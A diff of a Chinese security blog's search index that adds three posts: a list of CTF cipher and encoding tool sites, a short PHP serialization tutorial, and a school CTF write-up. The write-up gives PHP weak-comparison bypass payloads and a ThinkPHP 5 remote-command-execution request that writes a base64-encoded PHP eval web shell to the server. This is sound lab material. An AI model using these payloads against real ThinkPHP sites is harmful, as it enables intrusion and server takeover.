@@ -136,6 +136,142 @@
       </tags>
   </entry>
   <entry>
+    <title>CTF之密码学常用网站汇总</title>
+    <url>/2020/11/27/ctf%E4%B9%8B%E5%AF%86%E7%A0%81%E5%AD%A6%E5%B8%B8%E7%94%A8%E7%BD%91%E7%AB%99%E6%B1%87%E6%80%BB/</url>
+    <content><![CDATA[<h1 id="CTF之密码学常用网站汇总-转"><a href="#CTF之密码学常用网站汇总-转" class="headerlink" title="CTF之密码学常用网站汇总(转)"></a>CTF之密码学常用网站汇总(转)</h1><a id="more"></a>
+
+<p>CTF中那些脑洞大开的编码和加密 <a href="https://www.tuicool.com/articles/2E3INnm">https://www.tuicool.com/articles/2E3INnm</a></p>
+<p>一篇文章彻底弄懂Base64编码原理 <a href="https://blog.csdn.net/wo541075754/article/details/81734770">https://blog.csdn.net/wo541075754/article/details/81734770</a></p>
+<p>史上最全ASCII码对照表0-255（%d） <a href="https://blog.csdn.net/yueyueniaolzp/article/details/82178954">https://blog.csdn.net/yueyueniaolzp/article/details/82178954</a></p>
+<p>攻防世界的一些write-up <a href="https://www.jianshu.com/u/32aab16373de">https://www.jianshu.com/u/32aab16373de</a></p>
+<p>unicode编码转换： <a href="http://tool.chinaz.com/tools/unicode.aspx">http://tool.chinaz.com/tools/unicode.aspx</a></p>
+<p>base64在线解码网站 <a href="https://base64.supfree.net/">https://base64.supfree.net/</a></p>
+<p>摩尔斯电码在线解密网址:<a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></p>
+<p>培根密码解密<a href="https://netair.xyz/tools/%E5%9F%B9%E6%A0%B9%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.html">https://netair.xyz/tools/培根密码加密解密.html</a></p>
+<p>python反编译 <a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p>
+<p>brainfuck/Ook编码：<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p>
+<p>CTF ——crypto ——RSA原理及各种题型总结：<a href="https://blog.csdn.net/vhkjhwbs/article/details/101160822#4.%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB">https://blog.csdn.net/vhkjhwbs/article/details/101160822#4.%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB</a><br>xssee:<a href="http://web2hack.org/xssee">http://web2hack.org/xssee</a></p>
+<p>xssee:<a href="http://evilcos.me/lab/xssee">http://evilcos.me/lab/xssee</a></p>
+<p>程默的博客(DES,3DES,AES,RC,Blowfish,Twofish,Serpent,Gost,Rijndael,Cast,Xtea,RSA):<a href="http://tool.chacuo.net/cryptdes">http://tool.chacuo.net/cryptdes</a></p>
+<p>在线编码解码(多种并排):<a href="http://bianma.911cha.com/">http://bianma.911cha.com</a></p>
+<p>在线加密解密(多种):<a href="http://encode.chahuo.com/">http://encode.chahuo.com</a></p>
+<p>Unicode转中文:<a href="http://www.bejson.com/convert/unicode_chinese">http://www.bejson.com/convert/unicode_chinese</a></p>
+<p>栅栏密码 &amp;&amp; 凯撒密码 &amp;&amp; 摩斯电码:<a href="http://heartsnote.com/tools/cipher.htm">http://heartsnote.com/tools/cipher.htm</a></p>
+<p>Caesar cipher(凯撒密码):<a href="http://planetcalc.com/1434/">http://planetcalc.com/1434/</a></p>
+<p>Quoted-Printable &amp;&amp; ROT13:<a href="http://www.mxcz.net/tools/QuotedPrintable.aspx">http://www.mxcz.net/tools/QuotedPrintable.aspx</a></p>
+<p>ROT5/13/18/47编码转换:<a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</a></p>
+<p>Base32/16:<a href="http://pbaseconverter.com/">http://pbaseconverter.com/</a></p>
+<p>Base32:<a href="https://tools.deamwork.com/crypt/decrypt/base32decode.html">https://tools.deamwork.com/crypt/decrypt/base32decode.html</a></p>
+<p>quipqiup古典密码自动化爆破(词频分析):<a href="http://quipqiup.com/index.php">http://quipqiup.com/index.php</a></p>
+<p>词频分析/替换:<a href="http://cryptoclub.org/tools/cracksub_topframe.php">http://cryptoclub.org/tools/cracksub_topframe.php</a></p>
+<p>‘+.&lt;&gt;[]’ &amp;&amp; ‘!.?’(Brainfuck/Ook!):<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p>
+<p>‘±.&lt;&gt;[]’(Brainfuck):<a href="https://www.nayuki.io/page/brainfuck-interpreter-javascript">https://www.nayuki.io/page/brainfuck-interpreter-javascript</a></p>
+<p>‘±.&lt;&gt;[]’(Brainfuck):<a href="http://esoteric.sange.fi/brainfuck/impl/interp/i.html">http://esoteric.sange.fi/brainfuck/impl/interp/i.html</a></p>
+<p>‘()[]!+’JavaScript编码(JSfuck):<a href="http://discogscounter.getfreehosting.co.uk/js-noalnum.php">http://discogscounter.getfreehosting.co.uk/js-noalnum.php</a></p>
+<p>用 6 个字符’()[]!+’来编写 JavaScript 程序(JSfuck同上):<a href="http://www.jsfuck.com/">http://www.jsfuck.com/</a></p>
+<p><a href="http://patriciopalladino.com/files/hieroglyphy/">http://patriciopalladino.com/files/hieroglyphy/</a></p>
+<p>摩斯密码翻译器:<a href="http://www.jb51.net/tools/morse.htm">http://www.jb51.net/tools/morse.htm</a></p>
+<p>Morse Code摩尔斯电码:<a href="http://rumkin.com/tools/cipher/morse.php">http://rumkin.com/tools/cipher/morse.php</a></p>
+<p>摩尔斯电码转换器:<a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></p>
+<p>字符串编码，解码，转换(长度,反转,进制转换):<a href="http://www.5ixuexiwang.com/str/">http://www.5ixuexiwang.com/str/</a></p>
+<p>Cisco Type 7 Reverser:<a href="http://packetlife.net/toolbox/type7">http://packetlife.net/toolbox/type7</a></p>
+<p>Cisco:<a href="http://www.ifm.net.nz/cookbooks/passwordcracker.html">http://www.ifm.net.nz/cookbooks/passwordcracker.html</a></p>
+<p>cmd5 &amp;&amp; NTLM &amp;&amp; mysql…:<a href="http://www.cmd5.com/">http://www.cmd5.com</a></p>
+<p>spammimic(字符2一段话):<a href="http://www.spammimic.com/">http://www.spammimic.com/</a></p>
+<p>js代码在线加密解密:<a href="https://tool.lu/js/">https://tool.lu/js/</a></p>
+<p>JScript/VBscript脚本解密(#@^…^#@):<a href="http://www.dheart.net/decode/index.php">http://www.dheart.net/decode/index.php</a></p>
+<p>VBScript.Encode解密(tip:Asp encode):<a href="http://adophper.com/encode.html">http://adophper.com/encode.html</a></p>
+<p>JScript.Encode脚本加密与解密:<a href="http://www.haokuwang.com/jsendecode.htm">http://www.haokuwang.com/jsendecode.htm</a></p>
+<p>‘+/v+’UTF-7加密:<a href="http://web2hack.org/xssee">http://web2hack.org/xssee</a></p>
+<p>各种无知密码解密:<a href="http://www.tools88.com/">http://www.tools88.com</a></p>
+<p>uuencode解码 &amp;&amp; xxencode解码(古老的邮件密码):<a href="http://web.chacuo.net/charsetuuencode">http://web.chacuo.net/charsetuuencode</a></p>
+<p>MIME标准(邮件编码的一种):<a href="http://dogmamix.com/MimeHeadersDecoder/">http://dogmamix.com/MimeHeadersDecoder/</a></p>
+<p>Binhex编码(邮件编码的一种,常见于MAC机):<a href="http://encoders-decoders.online-domain-tools.com/">http://encoders-decoders.online-domain-tools.com/</a></p>
+<p>%u8001%u9525非/u的hex，%u编码，只能编码汉字(xssee):<a href="http://web.chacuo.net/charsetescape">http://web.chacuo.net/charsetescape</a></p>
+<p>猪圈密码:<a href="http://www.simonsingh.net/The_Black_Chamber/pigpen.html">http://www.simonsingh.net/The_Black_Chamber/pigpen.html</a></p>
+<p>ppencode(把Perl代码转换成只有英文字母的字符串):<a href="http://namazu.org/~takesako/ppencode/demo.html">http://namazu.org/~takesako/ppencode/demo.html</a></p>
+<p>rrencode(把ruby代码全部转换成符号):挂了</p>
+<p>aaencode(JS代码转换成常用的网络表情，也就是我们说的颜文字js加密):<a href="http://utf-8.jp/public/aaencode.html">http://utf-8.jp/public/aaencode.html</a></p>
+<p>‘()[]!+’ &amp;&amp; ‘$=~[]+”_.();’jother编码jjencode(JS代码转换成只有符号的字符串):<a href="http://web2hack.org/xssee">http://web2hack.org/xssee</a></p>
+<p>jother（是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括：! + ( ) [ ] { }。只用这些字符就能完成对任意字符串的编码）:<a href="http://tmxk.org/jother/">http://tmxk.org/jother/</a></p>
+<p>jjencode/aaencode可用xssee &amp;&amp; Chrome的Console模式来直接输出解密。</p>
+<p>Manchester曼彻斯特解密：<a href="http://eleif.net/manchester.html">http://eleif.net/manchester.html</a></p>
+<p>Vigenère维多利亚解密：<a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p>
+<p>Vigenère cipher:<a href="http://planetcalc.com/2468/">http://planetcalc.com/2468/</a></p>
+<p>Hill cipher(希尔密码):<a href="http://planetcalc.com/3327/">http://planetcalc.com/3327/</a></p>
+<p>Atbash cipher(埃特巴什码):<a href="http://planetcalc.com/4647/">http://planetcalc.com/4647/</a></p>
+<p>snow(html隐写):<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html">http://fog.misty.com/perry/ccs/snow/snow/snow.html</a></p>
+<p>Serpent加密解密:<a href="http://serpent.online-domain-tools.com/">http://serpent.online-domain-tools.com/</a></p>
+<p>十六进制Hex转文本字符串:<a href="http://www.bejson.com/convert/ox2str/">http://www.bejson.com/convert/ox2str/</a></p>
+<p>Hex2text:<a href="http://www.convertstring.com/EncodeDecode/HexDecode">http://www.convertstring.com/EncodeDecode/HexDecode</a></p>
+<p>Binary(二进制)，ACSII,Hex(十六进制),Decimal(十进制):<a href="http://www.binaryhexconverter.com/">http://www.binaryhexconverter.com/</a></p>
+<p>集合:<a href="http://www.qqxiuzi.cn/daohang.htm">http://www.qqxiuzi.cn/daohang.htm</a></p>
+<p>集合（各种古典密码）:<a href="http://rumkin.com/tools/cipher/">http://rumkin.com/tools/cipher/</a></p>
+<p>文本加密为汉字(“盲文”，音符，各种语言，花朵，箭头…):<a href="http://www.qqxiuzi.cn/bianma/wenbenjiami.php">http://www.qqxiuzi.cn/bianma/wenbenjiami.php</a></p>
+<p>在线繁体字转换器:<a href="http://www.aies.cn/">http://www.aies.cn</a></p>
+<p>在线工具集合:<a href="http://tomeko.net/online_tools/">http://tomeko.net/online_tools/</a></p>
+<p>二维码/条形码:<a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com/</a></p>
+<p>生成二维码:<a href="http://www.wwei.cn/">http://www.wwei.cn/</a></p>
+<p>在线二维码解密:<a href="http://jiema.wwei.cn/">http://jiema.wwei.cn/</a></p>
+<p>Image2Base64:<a href="http://www.vgot.net/test/image2base64.php">http://www.vgot.net/test/image2base64.php</a></p>
+<p>与佛论禅:<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p>
+<p>在线分解GIF帧图:<a href="http://zh.bloggif.com/gif-extract">http://zh.bloggif.com/gif-extract</a></p>
+<p>bejson(杂乱):<a href="http://www.bejson.com/">http://www.bejson.com</a></p>
+<p>atool(杂乱):<a href="http://www.atool.org/">http://www.atool.org</a></p>
+<p>Punch Card:<a href="http://www.kloth.net/services/cardpunch.php">http://www.kloth.net/services/cardpunch.php</a></p>
+<p>分解素数(ESA):<a href="http://www.factordb.com/index.php">http://www.factordb.com/index.php</a></p>
+<p>文件在线Hash:<a href="http://www.atool.org/file_hash.php">http://www.atool.org/file_hash.php</a></p>
+<p>CTF中那些脑洞大开的编码和加密 <a href="https://www.tuicool.com/articles/2E3INnm">https://www.tuicool.com/articles/2E3INnm</a></p>
+<p>一篇文章彻底弄懂Base64编码原理 <a href="https://blog.csdn.net/wo541075754/article/details/81734770">https://blog.csdn.net/wo541075754/article/details/81734770</a></p>
+<p>史上最全ASCII码对照表0-255（%d） <a href="https://blog.csdn.net/yueyueniaolzp/article/details/82178954">https://blog.csdn.net/yueyueniaolzp/article/details/82178954</a></p>
+<p>攻防世界的一些write-up <a href="https://www.jianshu.com/u/32aab16373de">https://www.jianshu.com/u/32aab16373de</a></p>
+<p>unicode编码转换： <a href="http://tool.chinaz.com/tools/unicode.aspx">http://tool.chinaz.com/tools/unicode.aspx</a></p>
+<p>base64在线解码网站 <a href="https://base64.supfree.net/">https://base64.supfree.net/</a></p>
+<p>摩尔斯电码在线解密网址:<a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></p>
+<p>培根密码解密<a href="https://netair.xyz/tools/%E5%9F%B9%E6%A0%B9%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.html">https://netair.xyz/tools/培根密码加密解密.html</a></p>
+<p>python反编译 <a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p>
+<p>brainfuck/Ook编码：<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p>
+<p>CTF ——crypto ——RSA原理及各种题型总结：<a href="https://blog.csdn.net/vhkjhwbs/article/details/101160822#4.%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB">https://blog.csdn.net/vhkjhwbs/article/details/101160822#4.%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB</a></p>
+]]></content>
+      <categories>
+        <category>misc</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php序列化与反序列化</title>
+    <url>/2020/11/16/php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h1 id="php序列化与反序列化"><a href="#php序列化与反序列化" class="headerlink" title="php序列化与反序列化"></a>php序列化与反序列化</h1><blockquote>
+<p>我们在开发的过程中常常遇到需要把对象或者数组进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到<a href="https://www.w3cschool.cn/mysql/mysql-tutorial.html">mysql数据库</a>中时，我们时常需要将数组进行序列号操作。</p>
+</blockquote>
+<blockquote>
+<blockquote>
+<p><strong>序列化</strong>（串行化）：是将变量转换为可保存或传输的字符串的过程；</p>
+<p><strong>反序列化</strong>（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。</p>
+<p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p>
+<p>常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。</p>
+</blockquote>
+</blockquote>
+<h2 id="常见使用情况"><a href="#常见使用情况" class="headerlink" title="常见使用情况"></a>常见使用情况</h2><p>a.对象系列化使用情况：</p>
+<p>对象的创建的时候被存储到内存里，在解析的时候被销毁，如果机器重启，那么对象也将被销毁在新建。想要保存对象或者将对象传给另一台机器，就需要将对象串行化（序列化）；或者在需要存储数据到mysql等数据库中时需要系列化。</p>
+<p>将对象转化成字符串叫系列化(串行化)</p>
+<p>将字符串转化成对象叫反系列化(反串行化)</p>
+<p>b.数组系列化使用情况：</p>
+<p>在跨语言，跨设备传输数组时，存放数据库或nosql数据库时，由于两者之间的数据格式不同，所以要将数据统一转成json(<a href="http://lib.csdn.net/base/javascript">JavaScript</a> object )格式传输。</p>
+<h2 id="1-serialize和unserialize函数"><a href="#1-serialize和unserialize函数" class="headerlink" title="1. serialize和unserialize函数"></a>1. serialize和unserialize函数</h2><p>这两个是序列化和反序列化PHP中数据的常用函数</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;Apple&#x27;</span> ,<span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;banana&#x27;</span> , <span class="string">&#x27;c&#x27;</span> =&gt; <span class="string">&#x27;Coconut&#x27;</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">//序列化数组</span></span><br><span class="line">$s = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line"><span class="comment">//输出结果：a:3:&#123;s:1:&quot;a&quot;;s:5:&quot;Apple&quot;;s:1:&quot;b&quot;;s:6:&quot;banana&quot;;s:1:&quot;c&quot;;s:7:&quot;Coconut&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line">$o = unserialize($s);</span><br><span class="line">print_r($o);</span><br><span class="line"><span class="comment">//输出结果 Array ( [a] =&gt; Apple [b] =&gt; banana [c] =&gt; Coconut )</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>序列化与反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>upload-libs(1-15)</title>
     <url>/2020/11/16/upload-libs-1-15/</url>
     <content><![CDATA[<h1 id="upload-libs-1-15"><a href="#upload-libs-1-15" class="headerlink" title="upload-libs(1-15)"></a>upload-libs(1-15)</h1><h2 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h2><ol>
@@ -230,6 +366,137 @@
       </categories>
       <tags>
         <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>校赛writeup</title>
+    <url>/2020/11/28/%E6%A0%A1%E8%B5%9Bwriteup/</url>
+    <content><![CDATA[<h1 id="校赛writeup"><a href="#校赛writeup" class="headerlink" title="校赛writeup"></a>校赛writeup</h1><a id="more"></a>
+
+<h2 id="1-weak-type"><a href="#1-weak-type" class="headerlink" title="1.weak_type"></a>1.weak_type</h2><p>首先是get型数据，num用 ‘?num=XXX’形式提交，发现关键函数intval($num,0)，.intval()的返回值是整型，所以可以利用202020020.1，加小数位，然后intval()将它变为整数，完成level 1</p>
+<p>第二步，关键在这一句</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if($v1 !&#x3D; $v2 &amp;&amp; md5($v1)&#x3D;&#x3D;md5($v2))&#123;</span><br></pre></td></tr></table></figure>
+
+<p>利用特殊的v1，v2 值，v1=240610708    v2=QNKCDZO</p>
+<p>md5(‘240610708’)==md5(‘QNKCDZO’); //True </p>
+<p>md5(‘240610708’)===md5(‘QNKCDZO’); //False</p>
+<p>同时还可以利用md5不能处理数组来绕过，</p>
+<p>?v1[]=1&amp;v2[]=2</p>
+<p>完成level 2</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;202020020.1&amp;v1&#x3D;240610708&amp;v2&#x3D;QNKCDZO</span><br></pre></td></tr></table></figure>
+
+<p>第三步，if ($message-&gt;key == $key)</p>
+<p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0==”admin”这种形式绕过</p>
+<p>message={“key”:0}</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;202020020.1&amp;v1&#x3D;240610708&amp;v2&#x3D;QNKCDZO &#x2F;&#x2F;get提交</span><br><span class="line">message&#x3D;&#123;&quot;key&quot;:0&#125; &#x2F;&#x2F;post提交</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h2 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h2><p>看到ThinkPHP V5 ，直接查询这个版本的php有什么漏洞，查到是远程命令执行，</p>
+<p>还查到一篇博客<a href="https://blog.csdn.net/weixin_45949219/article/details/104334715">https://blog.csdn.net/weixin_45949219/article/details/104334715</a></p>
+<p>利用post传参，打入payload</p>
+<p>/index.php?s=captcha</p>
+<p>使用phpinfo函数验证</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;phpinfo&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;1  &#x2F;&#x2F;post提交</span><br></pre></td></tr></table></figure>
+
+<p>将一句话木马写入shell2.php</p>
+<p>echo “<?php @eval($_POST['xss']);?>” &gt;shell.php</p>
+<p>由于连接失败，使用base64编码</p>
+<p>/index.php?s=captcha</p>
+<p>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo -n YWFhPD9waHAgQGFzc2VydCgkX1BPU1RbJ3hzcyddKTs/PmJiYg== | base64 -d &gt; shell9.php</p>
+<p>使用蚁剑连接，注意Encode要使用chr或者base64</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?s&#x3D;captcha   &#x2F;&#x2F;get</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;echo -n YWFhPD9waHAgQGFzc2VydCgkX1BPU1RbJ3hzcyddKTs&#x2F;PmJiYg&#x3D;&#x3D; | base64 -d &gt; shell.php  &#x2F;&#x2F;post提交</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑网址栏填入</p>
+<p><a href="http://dmctf.vaala.cloud:28254/shell.php">http://dmctf.vaala.cloud:28254/shell.php</a></p>
+<p>密码：XSS </p>
+<p>打开虚拟终端，输入linux下查询所有环境变量的命令:  env  。看到flag</p>
+<h2 id="fungame"><a href="#fungame" class="headerlink" title="fungame"></a>fungame</h2><p>js小游戏，</p>
+<p><img src="/images/image-20201128200631110.png" alt="image-20201128200631110"></p>
+<p>这一句和下一句都是判断是不是最后一关，直接改成10，ctrl+s,保存，去第一关死一次，按Esc复活,然后进下一关就是第十关，<img src="/images/image-20201128201247698.png" alt="image-20201128201247698"></p>
+<p>改一下血量，飞镖数，然后站着打就行</p>
+<h2 id="SimpleQrcode"><a href="#SimpleQrcode" class="headerlink" title="SimpleQrcode"></a>SimpleQrcode</h2><p><img src="/images/output.gif"></p>
+<p>gif二维码，用</p>
+<p><img src="/images/image-20201128201713104.png" alt="image-20201128201713104"></p>
+<p>打开, 帧查看，手机扫码，得出flag</p>
+<h2 id="Check-In"><a href="#Check-In" class="headerlink" title="Check In"></a>Check In</h2><p>签到题，输入flag</p>
+<h2 id="fakezip"><a href="#fakezip" class="headerlink" title="fakezip"></a>fakezip</h2><p>没有密码提示，爆破跑了10分钟，无解，查询题目，好像是伪加密。</p>
+<p><img src="/images/image-20201128210129813.png" alt="image-20201128210129813"></p>
+<p>这两个是加密位，第一个是全局加密标志位，第二个是文件加密标志位，全改为00，直接解压。</p>
+<p>得到一串音符</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">♬♩¶♯♬♭♬♫♫♪♬∮♬♭‖♭♬♭♬∮♬♭‖♭♬♭♫♫♯&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>查询音符密码解密，</p>
+<p><strong><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue</a></strong></p>
+<h2 id="Base-family"><a href="#Base-family" class="headerlink" title="Base family"></a>Base family</h2><p>查询的是base编码，并且提示是base64,base16,base32……….全是base，</p>
+<p>查询有点像base91,用这个网站</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.dcode.fr&#x2F;base-91-encoding</span><br></pre></td></tr></table></figure>
+
+<p>然后把转码后的base编码放这个工具里</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.110.142.202&#x2F;tools&#x2F;CyberChef&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>然后一个一个试一下，或使用<img src="/images/image-20201128211941287.png" alt="image-20201128211941287">自动识别base编码。</p>
+<p>拿到flag</p>
+<h2 id="SlientEye"><a href="#SlientEye" class="headerlink" title="SlientEye"></a>SlientEye</h2><p>查询题目知道这是一个加密软件</p>
+<p><img src="/images/image-20201128212419959.png" alt="image-20201128212419959"></p>
+<p>下载下来，图片拖进去直接Encode,保存flag.txt ,得到</p>
+<p>一串unicode编码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#110;&amp;#49;&amp;#95;&amp;#98;&amp;#117;&amp;#95;&amp;#106;&amp;#49;&amp;#97;&amp;#110;&amp;#103;&amp;#95;&amp;#119;&amp;#117;&amp;#95;&amp;#100;&amp;#51;&amp;#125;</span><br></pre></td></tr></table></figure>
+
+<p>文件后缀改成html ,浏览器打开，<img src="/images/image-20201128212814094.png" alt="image-20201128212814094"></p>
+<p>得到flag</p>
+<h2 id="编码之王"><a href="#编码之王" class="headerlink" title="编码之王"></a>编码之王</h2><p>下载打开全是社会主义核心价值观，利用编码网站解码，</p>
+<p><a href="http://ctf.ssleye.com/cvencode.html">http://ctf.ssleye.com/cvencode.html</a></p>
+<p>拿到一堆 与佛论禅 的编码</p>
+<p>继续解码 <a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p>
+<p>拿到 新佛曰 的编码</p>
+<p>继续解码 <a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></p>
+<p>拿到 jsfuck编码</p>
+<p>直接放进浏览器控制窗口，运行，</p>
+<img src="/images/image-20201128213440615.png" alt="image-20201128213440615" style="zoom: 80%;">
+
+<h2 id="Collision"><a href="#Collision" class="headerlink" title="Collision"></a>Collision</h2><p>CRC32碰撞，</p>
+<p>网上查询crc32碰撞脚本，找到一个好用的，</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc</span>(<span class="params">_crc</span>):</span></span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    dic = string.printable</span><br><span class="line">    _input = _crc</span><br><span class="line">    _input = <span class="string">&quot;0X&quot;</span> + _input</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> h <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + n + h + m</span><br><span class="line">                    s = s.encode()</span><br><span class="line">                    <span class="comment"># print(str(binascii.crc32(s)), _input)</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">hex</span>(binascii.crc32(s)).upper() == _input.upper():</span><br><span class="line">                        print(_crc, <span class="string">&#x27;:&#x27;</span>, s.decode())</span><br><span class="line">                        print(l)</span><br><span class="line">                        sys.exit()  <span class="comment">#直接退出，不进行接下来的碰撞了，一般在做题的时候，碰撞不会重复</span></span><br><span class="line">                    l = l + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc32</span>():</span></span><br><span class="line">    print(<span class="string">&quot;四字节碰撞!!!&quot;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;你可能需要多个线程同时进行碰撞，请输入线程数：&quot;</span>))</span><br><span class="line">    _thread = []</span><br><span class="line">    _args = []</span><br><span class="line">    print(<span class="string">&quot;输入参数&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        print(i+<span class="number">1</span>, end=<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        _args.append(<span class="built_in">input</span>())</span><br><span class="line">    <span class="comment"># print(_args)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        t = threading.Thread(target=crc, args=(_args[i],))</span><br><span class="line">        _thread.append(t) <span class="comment">#如果在这里开始线程会出一点小bug，虽然不要紧，但是不好看，不信的话你们自己试试</span></span><br><span class="line">    <span class="comment"># print(_thread)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        _thread[i].start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        _thread[i].join()</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    crc32()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20201128213921232.png" alt="image-20201128213921232"></p>
+<img src="/images/image-20201128214307454.png" alt="image-20201128214307454" style="zoom: 80%;">
+
+<p>手动拼接一下，拿到flag</p>
+<h2 id="ARCHPR"><a href="#ARCHPR" class="headerlink" title="ARCHPR"></a>ARCHPR</h2><p>题目：This file was encrypted by me with a four-digit password, try to crack it!</p>
+<p>直接使用 ARCHPR 软件密码爆破，四位数字，拿到密码，hint.txt提示</p>
